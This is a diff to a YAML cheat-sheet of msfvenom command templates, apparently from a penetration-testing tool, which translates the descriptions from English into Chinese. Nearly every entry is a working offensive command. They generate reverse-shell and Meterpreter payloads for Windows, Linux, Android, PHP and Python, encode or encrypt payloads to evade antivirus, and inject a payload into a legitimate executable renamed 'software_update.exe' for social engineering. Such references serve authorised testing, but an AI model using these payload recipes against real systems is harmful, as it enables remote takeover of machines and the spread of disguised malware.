@@ -3,97 +3,84 @@ tags: [pentest, payload, exploitation, security, obfuscation, network, shellcode
 
 actions:
   # === LISTING AND INFORMATION ===
-  - title: msfvenom - list modules
+  - title: msfvenom - 列出模块
     desc: |
-      List all available modules within msfvenom for a specific type. 
-      This is the primary way to discover available payloads, encoders, nops, platforms, and output formats. 
-      Use this command whenever you are unsure of the exact name of a payload or architecture you need for your target.
+      列出 msfvenom 中特定类型的所有可用模块。这是发现可用 payload、encoder、nop、平台和输出格式的主要方式。
+      当你不确定目标所需 payload 或架构的确切名称时，使用此命令。
     command: "msfvenom -l {{module_type|payloads}}"
 
-  - title: msfvenom - list payload options
+  - title: msfvenom - 列出 Payload 选项
     desc: |
-      Display standard, advanced, and evasion options for a specific payload.
-      This is crucial for identifying required variables like LHOST and LPORT, as well as advanced settings like ExitOnSession. 
-      It helps in fine-tuning the payload behavior for specific network environments or target constraints.
+      显示特定 payload 的标准、高级和规避选项。这对识别 LHOST 和 LPORT 等必需变量以及 ExitOnSession 等高级设置至关重要。
+      有助于针对特定网络环境或目标约束微调 payload 行为。
     command: "msfvenom -p {{payload|windows/x64/meterpreter/reverse_tcp}} --list-options"
 
   # === OPERATING SYSTEM PAYLOADS ===
-  - title: msfvenom - windows reverse tcp exe
+  - title: msfvenom - Windows 反向 TCP EXE
     desc: |
-      Generate a standard Windows executable containing a staged Meterpreter reverse TCP payload. 
-      This is commonly used in penetration testing to establish a persistent or interactive shell on a target Windows machine. 
-      Note that raw executables generated this way are highly likely to be flagged by modern antivirus and EDR solutions.
+      生成包含分阶段 Meterpreter 反向 TCP payload 的标准 Windows 可执行文件。常用于渗透测试中在目标 Windows 机器上建立持久或交互式 shell。
+      注意以这种方式生成的原始可执行文件极有可能被现代杀软和 EDR 方案标记。
     command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{lhost}} LPORT={{lport|4444}} -f exe -o {{output_path|payload.exe}}"
 
-  - title: msfvenom - linux reverse tcp elf
+  - title: msfvenom - Linux 反向 TCP ELF
     desc: |
-      Create a Linux executable (ELF) for 64-bit architectures using a reverse TCP connection.
-      This payload is useful for exploiting Linux servers or workstations where you need the target to connect back to your listener.
-      The resulting file must be granted execution permissions (chmod +x) on the target system to run successfully.
+      使用反向 TCP 连接为 64 位架构创建 Linux 可执行文件（ELF）。此 payload 用于利用 Linux 服务器或工作站，需要目标回连到你的监听器。
+      生成的文件必须在目标系统上授予执行权限（chmod +x）才能成功运行。
     command: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{lhost}} LPORT={{lport|4444}} -f elf -o {{output_path|payload.elf}}"
 
-  - title: msfvenom - android reverse tcp apk
+  - title: msfvenom - Android 反向 TCP APK
     desc: |
-      Generate a malicious Android application package (APK) with a reverse TCP payload.
-      This is used for testing mobile security and demonstrates how a compromised app can grant remote access to a mobile device.
-      The target must have "Unknown Sources" enabled to install this unsigned APK unless further signing steps are taken.
+      生成带反向 TCP payload 的恶意 Android 应用包（APK）。用于测试移动安全，演示被攻陷的应用如何授予对移动设备的远程访问。
+      除非进行进一步的签名步骤，否则目标必须启用未知来源才能安装此未签名 APK。
     command: "msfvenom -p android/meterpreter/reverse_tcp LHOST={{lhost}} LPORT={{lport|4444}} -o {{output_path|payload.apk}}"
 
   # === WEB AND SCRIPT PAYLOADS ===
-  - title: msfvenom - php reverse shell
+  - title: msfvenom - PHP 反向 Shell
     desc: |
-      Generate a raw PHP script that initiates a reverse shell connection.
-      This is ideal for scenarios involving file upload vulnerabilities or remote file inclusion on web servers.
-      Once uploaded, navigating to the PHP file in a browser will trigger the connection back to your Metasploit handler.
+      生成发起反向 shell 连接的原始 PHP 脚本。适合涉及 Web 服务器文件上传漏洞或远程文件包含的场景。
+      上传后，在浏览器中访问该 PHP 文件将触发连接回你的 Metasploit handler。
     command: "msfvenom -p php/meterpreter/reverse_tcp LHOST={{lhost}} LPORT={{lport|4444}} -f raw -o {{output_path|shell.php}}"
 
-  - title: msfvenom - python reverse shell
+  - title: msfvenom - Python 反向 Shell
     desc: |
-      Create a Python script containing a reverse TCP payload.
-      Python payloads are highly portable across different operating systems as long as the Python interpreter is installed.
-      This is often used for cross-platform exploitation or when binary execution is restricted but scripting is allowed.
+      创建包含反向 TCP payload 的 Python 脚本。只要安装了 Python 解释器，Python payload 在不同操作系统之间具有高度可移植性。
+      常用于跨平台利用或当二进制执行受限但允许脚本时的场景。
     command: "msfvenom -p cmd/unix/reverse_python LHOST={{lhost}} LPORT={{lport|4444}} -f raw -o {{output_path|shell.py}}"
 
   # === EVASION AND CUSTOMIZATION ===
-  - title: msfvenom - encode payload
+  - title: msfvenom - 编码 Payload
     desc: |
-      Apply an encoder to a payload to assist in bypassing simple signature-based antivirus detection.
-      The iterations flag specifies how many times the payload will be encoded, which can help mask its structure.
-      Be aware that while encoding can bypass static signatures, dynamic analysis and behavior-based detection may still catch the payload.
+      对 payload 应用编码器，帮助绕过简单的基于签名的杀软检测。iterations 标志指定 payload 编码的次数，有助于掩盖其结构。
+      注意虽然编码可以绕过静态签名，但动态分析和基于行为的检测仍可能捕获 payload。
     command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} -e {{encoder|x86/shikata_ga_nai}} -i {{iterations|5}} -f {{format|exe}} -o {{output_path}}"
 
-  - title: msfvenom - encrypt shellcode
+  - title: msfvenom - 加密 Shellcode
     desc: |
-      Encrypt the shellcode using a specific algorithm and a custom key to evade detection.
-      This provides a more robust way of hiding the payload's logic from security scanners than traditional encoding.
-      You must provide an encryption key, and the resulting payload will decrypt itself in memory before execution.
+      使用特定算法和自定义密钥加密 shellcode 以规避检测。与传统编码相比，它提供更稳健的隐藏 payload 逻辑的方式，避免被安全扫描器发现。
+      你必须提供加密密钥，生成的 payload 会在执行前在内存中自行解密。
     command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} --encrypt {{encryption_type|aes256}} --encrypt-key {{key|secretkey}} -f {{format|exe}} -o {{output_path}}"
 
-  - title: msfvenom - avoid bad characters
+  - title: msfvenom - 规避坏字符
     desc: |
-      Generate shellcode while strictly avoiding a list of "bad characters" that might crash the target service.
-      This is essential for buffer overflow exploits where certain bytes like null bytes (\x00) or carriage returns act as delimiters.
-      Using this option forces msfvenom to automatically select an encoder to eliminate the prohibited characters.
+      生成 shellcode 时严格避免可能导致目标服务崩溃的坏字符列表。这对缓冲区溢出利用至关重要，因为空字节或回车等某些字节会充当分隔符。
+      使用此选项会强制 msfvenom 自动选择编码器以消除被禁止的字符。
     command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} -b \"{{bad_chars|\\x00\\x0a\\x0d}}\" -f {{format|c}}"
 
-  - title: msfvenom - inject into template
+  - title: msfvenom - 注入到模板
     desc: |
-      Inject the malicious payload into an existing legitimate executable file.
-      The -k (keep) flag ensures that the original functionality of the template application is preserved by running the payload in a new thread.
-      This technique is effective for social engineering as it makes the malicious file appear as a trusted, functional program.
+      将恶意 payload 注入现有的合法可执行文件。-k（keep）标志通过在新线程中运行 payload，确保保留模板应用的原始功能。
+      此技术对社工很有效，因为它使恶意文件看起来像可信且可正常工作的程序。
     command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} -x {{template_path|putty.exe}} -k -f exe -o {{output_path|software_update.exe}}"
 
   # === SHELLCODE GENERATION ===
-  - title: msfvenom - generate c shellcode
+  - title: msfvenom - 生成 C Shellcode
     desc: |
-      Output the payload as a byte array formatted for use in C or C++ source code.
-      This is the standard way to prepare shellcode for manual integration into exploit code or custom loaders.
-      The output will provide a variable name containing the shellcode which can be directly pasted into a source file.
+      将 payload 输出为用于 C 或 C++ 源码的字节数组格式。这是准备 shellcode 以手动集成到利用代码或自定义加载器中的标准方式。
+      输出会提供一个包含 shellcode 的变量名，可直接粘贴到源文件中。
     command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} -f c -v {{variable_name|shellcode}}"
 
-  - title: msfvenom - generate raw shellcode
+  - title: msfvenom - 生成原始 Shellcode
     desc: |
-      Generate a raw binary file containing only the shellcode without any file headers or wrappers.
-      This is useful for direct memory injection or when the payload is being delivered through a specific exploit vector.
-      Raw files are often processed by other tools or custom scripts before being deployed to the target.
+      生成只包含 shellcode 的原始二进制文件，没有任何文件头或包装。这对直接内存注入或通过特定利用向量投递 payload 很有用。
+      原始文件在部署到目标前通常由其他工具或自定义脚本处理。
     command: "msfvenom -p {{payload}} LHOST={{lhost}} LPORT={{lport|4444}} -f raw -o {{output_path|payload.bin}}"
